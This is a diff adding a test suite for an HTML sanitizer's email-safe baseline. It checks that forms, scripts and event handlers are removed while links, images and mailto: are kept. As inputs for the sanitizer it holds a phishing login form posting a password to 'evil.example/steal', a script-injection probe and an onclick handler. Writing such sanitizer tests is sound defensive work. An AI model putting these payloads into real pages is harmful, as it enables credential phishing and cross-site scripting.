@@ -1,0 +1,104 @@
+// Baselines: named sanitization targets.
+//
+// The default policy is a general-purpose web one. A caller embedding
+// untrusted HTML in a specific medium has a different, usually narrower,
+// requirement — and getting that narrowing right from scratch is the
+// error-prone part. `use_baseline` names the target instead.
+
+import core.htmlsanitizer
+import core.htmlsanitizer (HtmlSanitizer)
+import std.string
+import std.set
+import std.spec
+
+main() {
+    fw = spec.init()
+
+    spec.describe(fw, "email-safe baseline") {
+        spec.it("strips form controls — a form in an email is phishing") callback {
+            s = htmlsanitizer.new()
+            _ = htmlsanitizer.use_baseline(s, 1)
+            out = htmlsanitizer.sanitize(s,
+                "<form action=\"https://evil.example/steal\"><input name=\"pw\"><button>Log in</button></form>", "")
+            spec.assert_str_eq(out, "", "the whole login-box shape goes")
+            htmlsanitizer.free(s)
+        }
+
+        spec.it("keeps links and images — the point of most email") callback {
+            s = htmlsanitizer.new()
+            _ = htmlsanitizer.use_baseline(s, 1)
+            out = htmlsanitizer.sanitize(s,
+                "<p>Hi <a href=\"https://example.com/x\">click</a> <img src=\"https://example.com/i.png\"></p>", "")
+            spec.assert_true(string.contains(out, "<a href=") == 1, "links survive")
+            spec.assert_true(string.contains(out, "<img") == 1, "images survive")
+            htmlsanitizer.free(s)
+        }
+
+        spec.it("allows mailto:, which the web default does not") callback {
+            s = htmlsanitizer.new()
+            spec.assert_str_eq(htmlsanitizer.sanitize(s, "<a href=\"mailto:x@y.z\">m</a>", ""),
+                "<a>m</a>", "web default drops mailto:")
+            _ = htmlsanitizer.use_baseline(s, 1)
+            spec.assert_true(string.contains(
+                htmlsanitizer.sanitize(s, "<a href=\"mailto:x@y.z\">m</a>", ""), "mailto:") == 1,
+                "email baseline keeps it")
+            htmlsanitizer.free(s)
+        }
+
+        spec.it("drops document structure — an email is a fragment") callback {
+            s = htmlsanitizer.new()
+            _ = htmlsanitizer.use_baseline(s, 1)
+            out = htmlsanitizer.sanitize(s, "<html><body><p>hi</p></body></html>", "")
+            spec.assert_true(string.contains(out, "<html>") == 0,
+                "no nested document")
+            spec.assert_true(string.contains(out, "hi") == 1, "content survives")
+            htmlsanitizer.free(s)
+        }
+
+        spec.it("still blocks what the default blocks") callback {
+            s = htmlsanitizer.new()
+            _ = htmlsanitizer.use_baseline(s, 1)
+            out = htmlsanitizer.sanitize(s,
+                "<p onclick=\"x()\">a<script>alert(1)</script></p>", "")
+            spec.assert_str_eq(out, "<p>a</p>", "a baseline narrows, it never widens")
+            htmlsanitizer.free(s)
+        }
+
+        spec.it("reports what it removed, like any sanitize") callback {
+            s = htmlsanitizer.new()
+            _ = htmlsanitizer.use_baseline(s, 1)
+            _ = htmlsanitizer.sanitize(s, "<form><input></form>", "")
+            spec.assert_true(htmlsanitizer.removal_count(s) > 0,
+                "the baseline's removals are reported too")
+            htmlsanitizer.free(s)
+        }
+    }
+
+    spec.describe(fw, "baseline mechanism") {
+        spec.it("accepts the default as a no-op") callback {
+            s = htmlsanitizer.new()
+            spec.assert_true(htmlsanitizer.use_baseline(s, 0), "BASELINE_DEFAULT is valid")
+            spec.assert_str_eq(htmlsanitizer.sanitize(s, "<div>x</div>", ""),
+                "<div>x</div>", "policy unchanged")
+            htmlsanitizer.free(s)
+        }
+
+        spec.it("refuses an unknown id rather than silently defaulting") callback {
+            s = htmlsanitizer.new()
+            spec.assert_false(htmlsanitizer.use_baseline(s, 99),
+                "an unknown baseline is an error, not a quiet fallback")
+            htmlsanitizer.free(s)
+        }
+
+        spec.it("can be narrowed further afterwards") callback {
+            s = htmlsanitizer.new()
+            _ = htmlsanitizer.use_baseline(s, 1)
+            set.remove(s.allowed_tags, "img")
+            out = htmlsanitizer.sanitize(s, "<p><img src=\"https://e.com/i.png\">t</p>", "")
+            spec.assert_str_eq(out, "<p>t</p>", "a baseline is a starting point, not a cage")
+            htmlsanitizer.free(s)
+        }
+    }
+
+    spec.run_summary(fw)
+}
